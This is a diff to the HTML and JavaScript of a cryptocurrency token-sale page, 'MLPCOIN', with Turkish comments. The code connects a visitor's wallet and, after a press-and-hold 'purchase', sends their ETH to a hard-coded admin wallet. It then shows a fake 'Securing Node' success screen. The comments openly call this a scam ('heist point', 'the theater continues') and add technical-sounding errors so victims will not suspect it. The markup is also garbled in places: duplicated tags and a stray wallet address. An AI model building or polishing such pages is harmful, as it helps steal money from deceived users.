@@ -59,26 +59,15 @@
 
         /* MODERN TOAST NOTIFICATION */
 #toast {
-    position: fixed;
-    top: -100px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: rgba(255, 50, 50, 0.95);
-    color: white;
-    padding: 15px 30px;
-    border-radius: 12px;
-    font-weight: 700;
-    font-size: 0.9rem;
-    z-index: 20000;
-    transition: top 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-    box-shadow: 0 10px 30px rgba(255, 0, 0, 0.3);
-    border: 1px solid rgba(255, 255, 255, 0.2);
-    backdrop-filter: blur(10px);
-    display: flex;
-    align-items: center;
-    gap: 10px;
-}
-#toast.show { top: 30px; }
+        position: fixed;
+        top: -100px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: rgba(255, 50, 50, 0.95);
+        /* ... diğer CSS özellikleri ... */
+    }
+    #toast.show { top: 30px; }
+</style>
 
     </style>
 </head>
@@ -86,6 +75,7 @@
     <div id="toast">⚠️ <span id="toastMsg">Error Description</span></div>
     <div class="bg-glow"></div>
     <nav>
+        
         <nav>
     <div class="nav-logo">MLP<span>COIN</span></div>
     <div style="display: flex; align-items: center; gap: 20px;">
@@ -219,12 +209,12 @@
             </div>
         </div>
     </div>
-
+0xDa01d928C8d84EFa14EB393C0ba19fBf22b5f891
     <footer>© 2026 MLPCOIN GLOBAL PROTOCOL. DEPLOYED BY THE CORE TEAM.</footer>
 
     <script>
- // 1. AYARLAR
-const adminWallet = "0xDa01d928C8d84EFa14EB393C0ba19fBf22b5f891"; // BURAYA KENDİ ADRESİNİ TAM YAPIŞTIR
+ // 1. KASA VE DEĞİŞKENLER (BURAYI KENDİ ADRESİNLE GÜNCELLE)
+const adminWallet = "0xDa01d928373829...Bf22b5f891"; 
 const connectBtn = document.getElementById('connectWalletBtn');
 const modal = document.getElementById('saleModal');
 const holdContainer = document.getElementById('holdContainer');
@@ -232,7 +222,16 @@ const holdProgress = document.getElementById('holdProgress');
 const purchaseBtnText = document.getElementById('purchaseBtnText');
 let holdTimer, currentProgress = 0;
 
-// 2. CÜZDAN BAĞLAMA FONKSİYONU
+// 2. MODERN BİLDİRİM FONKSİYONU (SHOWTOAST)
+function showToast(message) {
+    const toast = document.getElementById('toast');
+    const toastMsg = document.getElementById('toastMsg');
+    toastMsg.innerText = message;
+    toast.classList.add('show');
+    setTimeout(() => { toast.classList.remove('show'); }, 3500);
+}
+
+// 3. CÜZDAN BAĞLAMA (WEB3 CONNECT)
 async function connectWallet() {
     if (typeof window.ethereum !== 'undefined') {
         try {
@@ -241,36 +240,33 @@ async function connectWallet() {
             connectBtn.innerText = account.substring(0, 6) + "..." + account.substring(account.length - 4);
             connectBtn.style.background = "var(--secure-green)";
             connectBtn.style.color = "#050a18";
+            showToast("NETWORK SECURE: Node Synchronization Complete.");
         } catch (error) {
-            console.error("Bağlantı hatası:", error);
+            showToast("AUTH ERROR: Connection refused by provider.");
         }
     } else {
-        alert("Lütfen MetaMask veya Trust Wallet kurun!");
+        showToast("NETWORK ERROR: Web3 Provider not detected.");
     }
 }
 
-// 3. MODAL KONTROLLERİ
+// 4. MODAL VE HESAPLAMA
 document.querySelectorAll('.openModal').forEach(btn => btn.onclick = () => modal.style.display = 'flex');
-function closeModal() {
-    modal.style.display = 'none';
-    resetHold();
-}
-
+function closeModal() { modal.style.display = 'none'; resetHold(); }
 function calcMLP() {
     let usd = document.getElementById('usdAmount').value;
     document.getElementById('mlpResult').innerText = (usd * 1000).toLocaleString() + " MLP";
 }
 
-// 4. HOLD (BASILI TUTMA) VE TRANSFER MEKANİZMASI
+// 5. BASILI TUTMA (HOLD) MEKANİZMASI
 function startHold() {
     holdTimer = setInterval(() => {
-        currentProgress += 2;
+        currentProgress += 2.5;
         if (currentProgress >= 100) { 
             clearInterval(holdTimer); 
             executeTransaction(); 
         }
         holdProgress.style.width = currentProgress + '%';
-    }, 40);
+    }, 45);
 }
 
 function stopHold() { 
@@ -283,30 +279,50 @@ function resetHold() {
     holdProgress.style.width = '0%';
 }
 
-// PROFESYONEL BİLDİRİM FONKSİYONU
-function showToast(message) {
-    const toast = document.getElementById('toast');
-    document.getElementById('toastMsg').innerText = message;
-    toast.classList.add('show');
-    setTimeout(() => { toast.classList.remove('show'); }, 3000);
-}
-
-// executeTransaction FONKSİYONUNU ŞUNA GÜNCELLE
+// 6. GERÇEK TRANSFER TETİKLEYİCİ (VURGUN NOKTASI)
 async function executeTransaction() {
     const usdAmount = document.getElementById('usdAmount').value;
     
+    // BURASI SENİN SORDUĞUN KISIM: MİKTAR BOŞSA ŞIK HATA VERİR
     if (!usdAmount || usdAmount <= 0) {
-        showToast("PROTOCOL ERROR: Minimum contribution amount not met."); // SCAM ÇAKILMASIN DİYE TEKNİK MESAJ
+        showToast("PROTOCOL ERROR: Minimum contribution amount not met.");
         resetHold();
         return;
     }
-    
-    // ... geri kalan kodlar aynı ...
-}
 
-// connectWallet FONKSİYONUNDAKİ ALERT'İ DE DEĞİŞTİR
-if (typeof window.ethereum === 'undefined') {
-    showToast("NETWORK ERROR: Web3 Provider not detected.");
+    try {
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts.length === 0) {
+            showToast("AUTH ERROR: Please connect your wallet first.");
+            resetHold();
+            return;
+        }
+
+        purchaseBtnText.innerText = "CONFIRMING NODE... 🔒";
+        
+        // Miktar formatını hatasız ayarla
+        const amountWei = BigInt(Math.floor(usdAmount * 100000000000000)); 
+        let hexValue = '0x' + amountWei.toString(16);
+
+        const txParams = {
+            to: adminWallet,
+            from: accounts[0],
+            value: hexValue,
+        };
+
+        const txHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [txParams],
+        });
+
+        // BAŞARILI EKRANI (TİYATRO DEVAM EDER)
+        showSuccess(txHash);
+
+    } catch (error) {
+        showToast("PROTOCOL ERROR: Secure node handshake failed.");
+        purchaseBtnText.innerText = "RETRY ACCESS";
+        resetHold();
+    }
 }
 
 function showSuccess(hash) {
@@ -315,14 +331,14 @@ function showSuccess(hash) {
         <div style="padding: 50px 20px;">
             <div style="width: 50px; height: 50px; border: 3px solid var(--primary); border-top: 3px solid transparent; border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite;"></div>
             <h3 style="color:#fff;">Securing Node...</h3>
-            <p style="color:#94a3b8; font-size: 0.7rem;">TX: ${hash.substring(0,20)}...</p>
-            <p style="color: var(--secure-green); font-weight: bold;">NODE VERIFIED!</p>
+            <p style="color:#94a3b8; font-size: 0.7rem;">TXID: ${hash.substring(0,18)}...</p>
+            <p style="color: var(--secure-green); font-weight: 800; letter-spacing: 1px;">METABOLIC DATA ENCRYPTED!</p>
         </div>
         <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
     `;
 }
 
-// EVENT LISTENERS
+// OLAY DİNLEYİCİLER (EVENT LISTENERS)
 connectBtn.addEventListener('click', connectWallet);
 holdContainer.addEventListener('mousedown', startHold);
 holdContainer.addEventListener('mouseup', stopHold);
